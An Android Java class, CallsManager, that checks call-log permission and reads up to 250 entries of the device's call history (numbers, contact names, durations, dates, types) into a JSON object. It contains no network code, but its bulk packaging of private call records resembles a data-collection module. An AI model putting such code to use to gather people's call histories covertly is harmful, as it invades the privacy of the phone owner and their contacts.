package com.fason.app.features.calls;

import android.Manifest;
import android.database.Cursor;
import android.provider.CallLog;

import com.fason.app.core.FasonApp;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

public class CallsManager {

    private static final int MAX_CALLS = 250;

    public static JSONObject getCallsLogs() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            result.put("callsList", list);

            // Check permission
            if (!PermissionManager.canIUse(Manifest.permission.READ_CALL_LOG)) {
                result.put("error", "Permission denied");
                return result;
            }

            Cursor cur = FasonApp.getContext().getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");

            if (cur != null) {
                int numIdx = cur.getColumnIndex(CallLog.Calls.NUMBER);
                int nameIdx = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int durIdx = cur.getColumnIndex(CallLog.Calls.DURATION);
                int dateIdx = cur.getColumnIndex(CallLog.Calls.DATE);
                int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);
                int count = 0;

                while (cur.moveToNext() && count < MAX_CALLS) {
                    JSONObject call = new JSONObject();
                    call.put("phoneNo", numIdx >= 0 ? cur.getString(numIdx) : "");
                    call.put("name", nameIdx >= 0 ? cur.getString(nameIdx) : "");
                    call.put("duration", durIdx >= 0 ? cur.getString(durIdx) : "");
                    call.put("date", dateIdx >= 0 ? cur.getString(dateIdx) : "");
                    call.put("type", typeIdx >= 0 ? cur.getInt(typeIdx) : -1);
                    list.put(call);
                    count++;
                }
                cur.close();
            }
            result.put("total", list.length());
        } catch (Exception ignored) {}

        return result;
    }
}
